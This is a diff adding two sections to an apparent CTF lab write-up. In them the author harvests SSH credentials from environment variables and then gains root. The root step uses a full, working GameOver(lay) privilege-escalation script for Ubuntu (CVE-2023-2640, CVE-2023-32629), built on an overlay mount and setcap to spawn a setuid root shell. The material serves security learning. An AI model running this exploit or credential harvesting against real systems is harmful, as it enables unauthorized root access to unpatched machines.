@@ -106,6 +106,57 @@ The exploit confirmed the target's vulnerability and successfully obtained a ses
 
 This successful exploitation resulted in a command shell session being opened, providing access to the target system. With this access, I can now execute commands directly on the compromised host, allowing for further enumeration and potential privilege escalation.
 
+## Task 9: Credential Discovery and SSH Access
+During my exploration of the system via the Metasploit session, I executed the env command to review the environment variables. This is a common practice to uncover potential credentials or other sensitive information that may be stored in the environment.
+
+The command and a snippet of its output are as follows:
+```bash
+env
+```
+
+Among the various entries, two variables stood out:
+
+- META_USER: A username for what seemed to be a system account.
+- META_PASS: A password that accompanied the username.
+
+![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/69b825d4-2ea1-468e-a812-b780d248dbd4)
+
+With these credentials in hand, I proceeded to attempt SSH access to the host. Using the META_USER and META_PASS, I was able to successfully authenticate over SSH, gaining a more stable and reliable connection to the target system.
+
+![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/4b027c91-f436-4624-b3a3-b0f58430574a)
+
+This sequence of events—from discovering sensitive environment variables to leveraging them for SSH access and finally locating the user flag—demonstrates a successful user-level compromise of the target system.
+
+## Task 10: Privilege Escalation and Root Flag Acquisition
+After stabilizing my SSH foothold as metalytics, I executed the uname -a command to determine the system's kernel version:
+```bash
+uname -a
+```
+![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/676271ee-c988-42df-bc82-da6243085d0a)
+
+The output revealed a kernel version potentially vulnerable to recent exploits [(CVE-2023-2640 and CVE-2023-32629)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629). Armed with this knowledge, I crafted a exploit.sh script in the /tmp directory to exploit these vulnerabilities:
+```bash
+#!/bin/bash
+
+# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
+# by g1vi https://github.com/g1vi
+# October 2023
+
+echo "[+] You should be root now"
+echo "[+] Type 'exit' to finish and leave the house cleaned"
+
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
+```
+Running this script successfully exploited the kernel vulnerabilities, granting me root privileges. I then navigated to the root user's home directory and listed its contents, where I found the root.txt file:
+
+![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/d93be8ff-0895-4091-8b76-c30468b9d97d)
+
+This confirmed my root access, as shown in the uploaded screenshot, where the presence of root.txt in the /root directory signifies successful privilege escalation.
+
+Finally, I was able to read the contents of root.txt and capture the root flag, marking the culmination of this CTF challenge.
+
+![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/062aceab-360d-4b71-acaf-ec2a6e7451e8)
+
 
 
 
